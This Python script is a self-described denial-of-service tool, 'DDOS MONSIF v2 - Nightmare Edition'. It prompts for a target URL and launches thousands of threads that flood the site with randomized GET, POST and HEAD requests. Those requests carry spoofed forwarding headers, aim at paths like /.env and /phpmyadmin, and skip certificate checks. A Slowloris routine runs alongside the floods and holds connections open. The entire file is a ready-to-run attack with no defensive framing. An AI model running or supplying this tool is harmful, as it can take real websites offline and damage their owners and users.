# -*- coding: utf-8 -*-
# DDOS MONSIF v2 - Nightmare Edition by Mr Monsif

import time
import random
import threading
import requests
import socket
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# === Banner ===
print(r"""
 █████╗ ██████╗  ██████╗ ███████╗    ███╗   ███╗ ██████╗ ███╗   ██╗███████╗███████╗
██╔══██╗██╔══██╗██╔════╝ ██╔════╝    ████╗ ████║██╔═══██╗████╗  ██║██╔════╝██╔════╝
███████║██████╔╝██║  ███╗█████╗      ██╔████╔██║██║   ██║██╔██╗ ██║█████╗  ███████╗
██╔══██║██╔═══╝ ██║   ██║██╔══╝      ██║╚██╔╝██║██║   ██║██║╚██╗██║██╔══╝  ╚════██║
██║  ██║██║     ╚██████╔╝███████╗    ██║ ╚═╝ ██║╚██████╔╝██║ ╚████║███████╗███████║
╚═╝  ╚═╝╚═╝      ╚═════╝ ╚══════╝    ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚══════╝

        ▓▓ DDOS MONSIF v2 - Nightmare Edition ▓▓ by Mr Monsif
""")

# === Get target URL ===
TARGET_URL = input("Enter target URL (e.g. https://example.com): ").strip()

# === Config ===
THREADS = 6000
DURATION = 696969
EVIL_PATHS = [
    "/", "/index", "/home", "/search", "/login", "/admin", "/api", "/.env",
    "/wp-json/wp/v2/users", "/phpmyadmin", "/graphql", "/panel", "/dashboard"
]
ROTATING_PROXIES = [None]  # You can add Tor or other proxies here

# === WebHammer Class ===
class WebHammer:
    def __init__(self):
        with open("user-agents.txt", "r") as f:
            self.user_agents = f.read().splitlines()
        self.referers = [
            "https://google.com/search?q=" + TARGET_URL,
            "https://youtube.com/results?search_query=" + TARGET_URL,
            "https://bing.com/search?q=" + TARGET_URL
        ]

    def nuclear_request(self):
        while True:
            try:
                session = requests.Session()
                proxy = random.choice(ROTATING_PROXIES)
                path = random.choice(EVIL_PATHS)
                headers = {
                    "User-Agent": random.choice(self.user_agents),
                    "Referer": random.choice(self.referers),
                    "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4)),
                    "Accept": "*/*",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Cache-Control": "no-cache",
                    "Connection": "keep-alive"
                }

                full_url = f"{TARGET_URL}{path}"
                method = random.choice(["GET", "POST", "HEAD"])

                if method == "POST":
                    session.post(
                        full_url,
                        headers=headers,
                        data={"payload": "A" * random.randint(1024, 20480)},
                        proxies={"http": proxy, "https": proxy},
                        timeout=30,
                        verify=False
                    )
                elif method == "HEAD":
                    session.head(
                        full_url,
                        headers=headers,
                        proxies={"http": proxy, "https": proxy},
                        timeout=30,
                        verify=False
                    )
                else:
                    session.get(
                        full_url + f"?rand={random.randint(10000, 999999)}",
                        headers=headers,
                        proxies={"http": proxy, "https": proxy},
                        timeout=30,
                        verify=False
                    )

                print("[✓] Sending request to target...")

            except Exception:
                pass

# === Slowloris attack ===
def slowloris_ambush():
    while True:
        try:
            host = TARGET_URL.split("//")[1].split("/")[0]
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, 80))
            s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode())
            while True:
                s.send(f"X-a: {random.randint(1,9999)}\r\n".encode())
                time.sleep(100)
        except Exception:
            pass

# === Main Execution ===
if __name__ == "__main__":
    for _ in range(THREADS):
        threading.Thread(target=WebHammer().nuclear_request, daemon=True).start()
        threading.Thread(target=slowloris_ambush, daemon=True).start()
    time.sleep(DURATION)
